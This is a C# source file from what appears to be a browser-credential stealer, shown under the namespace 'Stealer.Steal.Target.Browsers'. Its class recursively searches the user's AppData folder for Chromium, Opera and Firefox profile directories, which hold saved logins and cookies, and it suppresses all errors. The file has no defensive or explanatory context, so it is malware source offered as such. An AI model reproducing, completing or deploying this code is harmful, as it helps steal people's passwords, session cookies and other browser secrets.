using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.Steal.Target.Browsers;

internal class BrowserSearcher
{
	public static string[] Chromium()
	{
		List<string> list = new List<string>();
		string currentDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData");
		SearchFolders(currentDirectory, "User Data", list, chromium: true);
		SearchFolders(currentDirectory, "Opera", list, chromium: false);
		return list.ToArray();
	}

	public static string[] Gecko()
	{
		List<string> list = new List<string>();
		SearchFolders(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData"), "Profiles", list, chromium: false);
		return list.ToArray();
	}

	public static void SearchFolders(string currentDirectory, string targetFolderName, List<string> foundFolders, bool chromium)
	{
		try
		{
			string[] directories = Directory.GetDirectories(currentDirectory, targetFolderName, SearchOption.TopDirectoryOnly);
			foreach (string text in directories)
			{
				if (foundFolders.Contains(text))
				{
					continue;
				}
				if (chromium)
				{
					if (File.Exists(Path.Combine(text, "Last Version")) || File.Exists(Path.Combine(text, "Local State")))
					{
						foundFolders.Add(text);
					}
				}
				else
				{
					foundFolders.Add(text);
				}
			}
			directories = Directory.GetDirectories(currentDirectory);
			for (int i = 0; i < directories.Length; i++)
			{
				SearchFolders(directories[i], targetFolderName, foundFolders, chromium);
			}
		}
		catch
		{
		}
	}
}
